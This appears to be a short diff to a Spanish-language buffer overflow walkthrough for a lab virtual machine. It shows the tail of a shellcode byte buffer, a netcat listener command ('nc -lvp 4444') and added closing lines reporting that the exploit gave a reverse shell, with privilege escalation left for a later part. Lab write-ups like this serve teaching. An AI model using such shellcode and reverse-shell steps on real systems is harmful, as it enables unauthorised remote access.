@@ -196,3 +196,8 @@ buf += b"\x57\x34\x53\x74\x32\x30\x6f\x70\x6a\x63\x30\x42\x73"
 buf += b"\x4b\x4f\x79\x45\x41\x41"
 ````
 6. Lo pegamos en nuestro script, creamos un listener en nuestro kali ```` nc -lvp 4444```` y ejecutamos el script.
+
+7. De esta forma obtenemos una reverse shell y hemos conseguido la explotación del BoF. Ahora quedaría la parte de la escalada de privilegios en la MV. Lo dejaremos para una segunda parte.
+
+**Espero que os haya gustado**
+**Hasta la próxima**
